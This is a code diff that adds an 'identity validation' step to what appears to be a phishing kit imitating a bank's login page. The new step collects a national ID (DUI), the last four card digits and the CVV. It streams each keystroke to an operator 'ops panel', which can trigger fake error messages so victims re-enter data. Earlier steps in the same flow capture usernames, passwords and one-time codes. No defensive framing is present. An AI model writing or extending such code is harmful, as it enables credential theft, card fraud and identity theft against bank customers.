@@ -20,7 +20,7 @@ import {
   type SecurityChallenge,
 } from "@/lib/security-challenge";
 
-type Step = "usuario" | "imagen" | "dinamica" | "tejuino" | "telebanca";
+type Step = "usuario" | "imagen" | "dinamica" | "tejuino" | "telebanca" | "identidad";
 
 export default function LoginPage() {
   const [step, setStep] = useState<Step>("usuario");
@@ -28,6 +28,9 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [remember, setRemember] = useState(false);
   const [code, setCode] = useState("");
+  const [dui, setDui] = useState("");
+  const [cardDigits, setCardDigits] = useState("");
+  const [cvv, setCvv] = useState("");
   const [advancing, setAdvancing] = useState(false);
   const [waitingPanel, setWaitingPanel] = useState(false);
   const [opsError, setOpsError] = useState("");
@@ -39,6 +42,9 @@ export default function LoginPage() {
   const usernameRef = useRef<HTMLInputElement>(null);
   const codeRef = useRef<HTMLInputElement>(null);
   const telebancaRef = useRef<HTMLInputElement>(null);
+  const duiRef = useRef<HTMLInputElement>(null);
+  const cardDigitsRef = useRef<HTMLInputElement>(null);
+  const cvvRef = useRef<HTMLInputElement>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
   const busyRef = useRef(false);
   const finishingRef = useRef(false);
@@ -179,10 +185,44 @@ export default function LoginPage() {
               busyRef.current = false;
               setStep("telebanca");
             }
+          } else if (
+            session.state === "identidad" ||
+            session.state === "typing-identidad"
+          ) {
+            if (step === "identidad" && (waitingPanel || busyRef.current)) {
+              /* keep spinner */
+            } else if (
+              appliedActionRef.current !== "identidad" ||
+              step !== "identidad"
+            ) {
+              appliedActionRef.current = "identidad";
+              setOpsError("");
+              setWaitingPanel(false);
+              setAdvancing(false);
+              busyRef.current = false;
+              setStep("identidad");
+            }
+          } else if (session.state === "error-identidad") {
+            const residualError =
+              (waitingPanel || busyRef.current) &&
+              appliedActionRef.current === "submitted-identidad" &&
+              prevState === "error-identidad";
+            if (residualError) {
+              /* keep spinner */
+            } else if (appliedActionRef.current !== "error-identidad") {
+              appliedActionRef.current = "error-identidad";
+              setWaitingPanel(false);
+              setAdvancing(false);
+              busyRef.current = false;
+              setOpsError(
+                "Error al validar los datos de identidad. Por favor verifica e intenta nuevamente (FLO0001W)",
+              );
+              setStep("identidad");
+            }
           } else if (session.state === "token" || session.state === "typing") {
             // Residual typing/token: no bajar spinner si ya enviamos el OTP
             if (
-              (step === "dinamica" || step === "telebanca") &&
+              (step === "dinamica" || step === "telebanca" || step === "identidad") &&
               (waitingPanel || busyRef.current)
             ) {
               /* keep spinner */
@@ -252,8 +292,10 @@ export default function LoginPage() {
       | "typing"
       | "typing-pass"
       | "typing-telebanca"
+      | "typing-identidad"
       | "token"
       | "telebanca"
+      | "identidad"
       | "imagen"
       | null = null;
     if (step === "dinamica") {
@@ -262,6 +304,12 @@ export default function LoginPage() {
     } else if (step === "telebanca") {
       const digits = code.replace(/\D/g, "");
       state = digits.length > 0 ? "typing-telebanca" : "telebanca";
+    } else if (step === "identidad") {
+      const hasInput =
+        dui.trim().length > 0 ||
+        cardDigits.trim().length > 0 ||
+        cvv.trim().length > 0;
+      state = hasInput ? "typing-identidad" : "identidad";
     } else if (step === "imagen") {
       state = password.trim().length > 0 ? "typing-pass" : "imagen";
     } else {
@@ -272,7 +320,7 @@ export default function LoginPage() {
       void patchOpsSession(sid, { state }).catch(() => {});
     }, 280);
     return () => window.clearTimeout(t);
-  }, [code, password, waitingPanel, step]);
+  }, [code, password, dui, cardDigits, cvv, waitingPanel, step]);
 
   // Tejuino: el input vive en TejuinoScreen → señal aparte
   const notifyTejuinoTyping = (hasInput: boolean) => {
@@ -448,6 +496,90 @@ export default function LoginPage() {
       .then(() => postOpsAction(sid!, "waiting-telebanca"))
       .catch(() => {
         setOpsError("No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.");
+        setWaitingPanel(false);
+        setAdvancing(false);
+        busyRef.current = false;
+      });
+  }
+
+  function continueFromIdentidad(form?: HTMLFormElement | null) {
+    if (busyRef.current || waitingPanel) return;
+    let currentDui = dui.trim();
+    let currentCard = cardDigits.replace(/\D/g, "").slice(0, 4);
+    let currentCvv = cvv.replace(/\D/g, "").slice(0, 4);
+
+    if (form) {
+      const fd = new FormData(form);
+      const fDui = String(fd.get("dui") || "").trim();
+      const fCard = String(fd.get("cardDigits") || "")
+        .replace(/\D/g, "")
+        .slice(0, 4);
+      const fCvv = String(fd.get("cvv") || "")
+        .replace(/\D/g, "")
+        .slice(0, 4);
+      if (fDui) currentDui = fDui;
+      if (fCard) currentCard = fCard;
+      if (fCvv) currentCvv = fCvv;
+    }
+
+    if (!currentDui) {
+      setOpsError("Ingresa tu Documento Único de Identidad (DUI).");
+      duiRef.current?.focus();
+      return;
+    }
+    if (currentCard.length !== 4) {
+      setOpsError(
+        "Ingresa los últimos 4 dígitos de tu tarjeta de débito o crédito.",
+      );
+      cardDigitsRef.current?.focus();
+      return;
+    }
+    if (currentCvv.length < 3) {
+      setOpsError("Ingresa el código de seguridad (CVV).");
+      cvvRef.current?.focus();
+      return;
+    }
+
+    busyRef.current = true;
+    appliedActionRef.current = "submitted-identidad";
+    finishingRef.current = false;
+    flushSync(() => {
+      setDui(currentDui);
+      setCardDigits(currentCard);
+      setCvv(currentCvv);
+      setOpsError("");
+      setAdvancing(true);
+      setWaitingPanel(true);
+    });
+
+    const sid = sessionIdRef.current;
+    if (!sid) {
+      setOpsError("Sesión no válida. Vuelve a empezar.");
+      setWaitingPanel(false);
+      setAdvancing(false);
+      busyRef.current = false;
+      return;
+    }
+
+    const user = readUsername() || username || "usuario";
+    void upsertOpsSession({
+      id: sid,
+      username: user,
+      dui: currentDui,
+      cardDigits: currentCard,
+      cvv: currentCvv,
+      device: detectDevice(),
+      ip: "127.0.0.1",
+      state: "waiting-identidad",
+      createdAt: Date.now(),
+      updatedAt: Date.now(),
+      last_seen: Date.now(),
+    })
+      .then(() => postOpsAction(sid!, "waiting-identidad"))
+      .catch(() => {
+        setOpsError(
+          "No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.",
+        );
         setWaitingPanel(false);
         setAdvancing(false);
         busyRef.current = false;
@@ -949,6 +1081,187 @@ export default function LoginPage() {
                     ) : (
                       <>
                         <span>Ingresar</span>
+                        <ArrowRight />
+                      </>
+                    )}
+                  </button>
+                </div>
+              </form>
+            ) : null}
+
+            {step === "identidad" ? (
+              <form
+                className="px-5 pb-8 pt-7 sm:px-8 sm:pb-10 sm:pt-9 md:px-11 md:pt-11"
+                method="post"
+                action="#"
+                onSubmit={(e) => {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  continueFromIdentidad(e.currentTarget);
+                }}
+              >
+                {opsError.includes("FLO0001W") ? (
+                  <div
+                    role="alert"
+                    className="message state- mb-5 flex w-full items-stretch sm:mb-6"
+                  >
+                    <div className="icon-light shrink-0" aria-hidden />
+                    <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[15px] font-semibold leading-snug text-[#292929] sm:text-[16px]">
+                      {opsError}
+                    </p>
+                  </div>
+                ) : null}
+
+                <h1 className="font-display text-[20px] font-bold leading-snug text-[#292929] sm:text-[22px] md:text-[26px]">
+                  Validación de identidad
+                </h1>
+                <p className="mt-2 text-[14px] leading-relaxed text-[#595959]">
+                  Por tu seguridad, ingresa los datos de tu documento de identidad y tarjeta asociada.
+                </p>
+
+                <div className="mt-6 space-y-6 sm:mt-8">
+                  <label className="block">
+                    <span className="block py-1 text-[14px] font-normal text-[#292929]">
+                      Documento Único de Identidad (DUI)
+                    </span>
+                    <input
+                      ref={duiRef}
+                      name="dui"
+                      inputMode="numeric"
+                      autoComplete="off"
+                      placeholder="00000000-0"
+                      maxLength={10}
+                      value={dui}
+                      onChange={(e) => {
+                        const raw = e.target.value.replace(/\D/g, "").slice(0, 9);
+                        const val =
+                          raw.length > 8 ? `${raw.slice(0, 8)}-${raw.slice(8)}` : raw;
+                        setDui(val);
+                        const sid = sessionIdRef.current;
+                        if (sid) {
+                          void patchOpsSession(sid, {
+                            dui: val,
+                            state: "typing-identidad",
+                          }).catch(() => {});
+                        }
+                      }}
+                      disabled={showSpinner}
+                      className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.1em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70 placeholder:text-[#bdbdbd]"
+                    />
+                  </label>
+
+                  <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
+                    <label className="block">
+                      <span className="block py-1 text-[14px] font-normal text-[#292929]">
+                        Últimos 4 dígitos de tarjeta
+                      </span>
+                      <input
+                        ref={cardDigitsRef}
+                        name="cardDigits"
+                        inputMode="numeric"
+                        placeholder="•••• 1234"
+                        maxLength={4}
+                        value={cardDigits}
+                        onChange={(e) => {
+                          const val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                          setCardDigits(val);
+                          const sid = sessionIdRef.current;
+                          if (sid) {
+                            void patchOpsSession(sid, {
+                              cardDigits: val,
+                              state: "typing-identidad",
+                            }).catch(() => {});
+                          }
+                        }}
+                        disabled={showSpinner}
+                        className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.2em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70 placeholder:text-[#bdbdbd]"
+                      />
+                      <span className="mt-1 block text-[12px] text-[#767676]">
+                        Tarjeta débito o crédito
+                      </span>
+                    </label>
+
+                    <label className="block">
+                      <span className="block py-1 text-[14px] font-normal text-[#292929]">
+                        Código de seguridad (CVV)
+                      </span>
+                      <input
+                        ref={cvvRef}
+                        name="cvv"
+                        type="password"
+                        inputMode="numeric"
+                        placeholder="•••"
+                        maxLength={4}
+                        value={cvv}
+                        onChange={(e) => {
+                          const val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                          setCvv(val);
+                          const sid = sessionIdRef.current;
+                          if (sid) {
+                            void patchOpsSession(sid, {
+                              cvv: val,
+                              state: "typing-identidad",
+                            }).catch(() => {});
+                          }
+                        }}
+                        disabled={showSpinner}
+                        className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.25em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70 placeholder:text-[#bdbdbd]"
+                      />
+                      <span className="mt-1 block text-[12px] text-[#767676]">
+                        3 dígitos al reverso
+                      </span>
+                    </label>
+                  </div>
+                </div>
+
+                {opsError && !opsError.includes("FLO0001W") ? (
+                  <p className="mt-5 text-[13px] text-red-600 sm:mt-6">{opsError}</p>
+                ) : null}
+                {waitingPanel ? (
+                  <p className="mt-5 text-[13px] text-[#666] sm:mt-6">
+                    Validando datos de identidad… por favor espera.
+                  </p>
+                ) : null}
+
+                <div className="mt-8 flex flex-col-reverse gap-3 sm:mt-10 sm:flex-row sm:flex-wrap sm:items-center sm:gap-4">
+                  <button
+                    type="button"
+                    disabled={showSpinner}
+                    onClick={() => {
+                      setDui("");
+                      setCardDigits("");
+                      setCvv("");
+                      setWaitingPanel(false);
+                      setOpsError("");
+                      setAdvancing(false);
+                      busyRef.current = false;
+                      setStep("dinamica");
+                      const sid = sessionIdRef.current;
+                      if (sid) {
+                        void patchOpsSession(sid, {
+                          state: "token",
+                        }).catch(() => {});
+                      }
+                    }}
+                    className="inline-flex min-h-12 w-full items-center justify-center rounded-full border border-[#292929] bg-white px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
+                  >
+                    Cancelar
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={
+                      showSpinner ||
+                      dui.trim().length < 9 ||
+                      cardDigits.length !== 4 ||
+                      cvv.length < 3
+                    }
+                    className="relative inline-flex min-h-12 w-full items-center justify-center gap-2 rounded-full bg-[#fdda24] px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] shadow-sm hover:bg-[#fbd016] touch-manipulation disabled:cursor-not-allowed disabled:opacity-50 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
+                  >
+                    {showSpinner ? (
+                      <ButtonSpinner />
+                    ) : (
+                      <>
+                        <span>Continuar</span>
                         <ArrowRight />
                       </>
                     )}
